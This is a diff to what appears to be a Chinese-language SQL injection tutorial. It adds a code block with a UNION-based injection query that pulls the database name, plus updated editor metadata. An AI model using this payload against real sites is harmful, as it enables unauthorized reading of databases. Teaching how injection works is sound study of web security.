@@ -140,7 +140,11 @@ UNION ALL SELECT
 
 ![输入图片说明](/imgs/2023-05-09/iEagi3JRwFAIS0ik.png)
 
-                                                                                                                                                                                                                                                                                                                                            
+
+
+```
+SELECT username FROM user WHERE id='-4319' UNION ALL SELECT CONCAT(0x716b766b71,IFNULL(CAST(DATABASE() AS NCHAR),0x20),0x716a627071)-- -'
+```                                                                                                                                                                                                                                                                                                                                            
 
 
 
@@ -187,11 +191,11 @@ UNION注入速度最快，但需要在页面直接回显数据库信息时才可
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTg5Nzk2NzY3MSwxNDA1MTYyMzQ5LDEwOD
-g3MzczNDUsMjY5MjA1MDkzLC0yNTEzODY0OTMsLTQ5ODcwMDUy
-OCwtMjcxNjQyOTY5LC04NTg3ODI5NTgsMTE3NzEwNzgyOSwyOD
-A3ODQ0NTMsMTE3MDM0NTg5OSwtMTcxMTMzMjg1OCw3OTYyODMx
-MDgsODg5ODMyNTk0LDE4MDM1MDE0ODYsLTY3NDY1NDk1OCwxNT
-g5MDQ4NTg5LC0xODU4ODYyOTU3LC0xNTY2MzU0MTcwLDI3MTk5
-MDYzNF19
+eyJoaXN0b3J5IjpbLTc3OTI3OTUxNCwtODk3OTY3NjcxLDE0MD
+UxNjIzNDksMTA4ODczNzM0NSwyNjkyMDUwOTMsLTI1MTM4NjQ5
+MywtNDk4NzAwNTI4LC0yNzE2NDI5NjksLTg1ODc4Mjk1OCwxMT
+c3MTA3ODI5LDI4MDc4NDQ1MywxMTcwMzQ1ODk5LC0xNzExMzMy
+ODU4LDc5NjI4MzEwOCw4ODk4MzI1OTQsMTgwMzUwMTQ4NiwtNj
+c0NjU0OTU4LDE1ODkwNDg1ODksLTE4NTg4NjI5NTcsLTE1NjYz
+NTQxNzBdfQ==
 -->
